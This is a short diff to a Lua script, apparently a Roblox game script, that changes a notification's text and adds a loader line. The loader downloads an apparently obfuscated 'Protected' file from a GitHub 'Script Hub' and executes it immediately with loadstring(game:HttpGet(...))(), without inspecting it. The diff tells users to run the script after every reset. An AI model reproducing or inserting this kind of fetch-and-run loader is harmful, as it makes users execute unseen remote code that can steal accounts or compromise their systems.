@@ -68,4 +68,5 @@ local function showCustomNotification(title, text, duration)
 end
 
 -- Example usage
-showCustomNotification("Normal Sonic","WARNING: NORMAL SONIC FAILED TO LOAD!", 8)
+showCustomNotification("Public Normal Sonic","Execute this script every you get reset.", 8)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NaturalNi13/Naturals-Script-Hub/refs/heads/main/Protected_1958759577188810.lua.txt"))()
